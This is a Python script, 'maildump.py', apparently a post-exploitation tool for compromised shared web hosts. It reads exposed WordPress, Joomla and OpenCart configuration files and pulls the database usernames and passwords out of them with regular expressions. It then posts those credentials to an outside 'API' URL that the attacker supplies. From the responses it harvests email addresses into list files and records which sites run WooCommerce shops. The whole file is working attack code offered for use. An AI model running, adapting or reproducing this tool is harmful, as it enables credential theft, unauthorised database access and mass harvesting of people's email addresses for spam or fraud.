# -*- coding: utf-8 -*-
import requests, re, os, sys

try:
	os.mkdir("Results/")
except:
	pass

def grabber(url, host, user, pswd, db, confname):
	try:
		woo = False
		print("API URL          : "+url)
		print("CONFIG NAME      : "+confname)
		res = 0
		builddata = {'host': host, 'user': user, 'pass': pswd, 'db': db, 'gass': 'pler'}
		print("POST DATA        : "+str(builddata))
		print("DB               : "+db)
		result = requests.post(urlapi, data=builddata, timeout=10).text
		if "woocommerce installed" in result:
			woo = True
		regexmail = """(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])"""
		regex = re.findall(regexmail, result)
		if regex:
			save = open("Results/"+db+".txt","a")
			reader = open("Results/"+db+".txt").read()
			for i in regex:
				if str(i) in reader:
					continue
				else:
					res = res + 1
					save.write(i+"\n")
			save.close()
			print("Found Maillist   : \033[32;1m"+str(res)+"\033[0m")
			print("Saved Maillist in: Results/"+db+".txt")
		else:
			print("Found Maillist   : \033[31;1m0\033[0m")
		if woo:
			print("Woocommerce      : \033[32;1mTrue\033[0m")
			wri = open("Woocommerce_list.txt","a")
			wri.write(confname+"\n")
			wri.close()
		else:
			print("Woocommerce      : \033[31;1mFalse\033[0m")
	except Exception as err:
		print("ERROR: "+str(err))
		pass

try:
	urlsym = sys.argv[1]
	urlapi = sys.argv[2]
except:
	print('python2 maildump.py symlink apilink')
	exit()

p = requests.get(urlsym).text
regex = re.findall('<td><a href="(.*?)">(.*?)</a></td>', p)
for i in regex:
	try:
		dbhost = "localhost"
		conf = i[0]
		if conf.endswith(".txt"):
			conf = conf
			source = requests.get(urlsym+conf, timeout=10).text
		if "Wordpress" in conf:
			dbuser = re.findall("DB_USER', '(.*?)'", source)[0]
			dbpass = re.findall("DB_PASSWORD', '(.*?)'", source)[0]
			dbname = re.findall("DB_NAME', '(.*?)'", source)[0]
		elif "Joomla" in conf:
			dbuser = re.findall("public $user = '(.*?)';", source)[0]
			dbpass = re.findall("public $password = '(.*?)';", source)[0]
			dbname = re.findall("public $db = '(.*?)';", source)[0]
		elif "OpenCart" in conf:
			dbuser = re.findall("define('DB_USERNAME', '(.*?)');", source)[0]
			dbpass = re.findall("define('DB_PASSWORD', '(.*?)');", source)[0]
			dbname = re.findall("define('DB_DATABASE', '(.*?)');", source)[0]
		else:
			continue
		grabber(urlapi, dbhost, dbuser, dbpass, dbname, conf)
		print("\n")
	except Exception as err:
		print(err)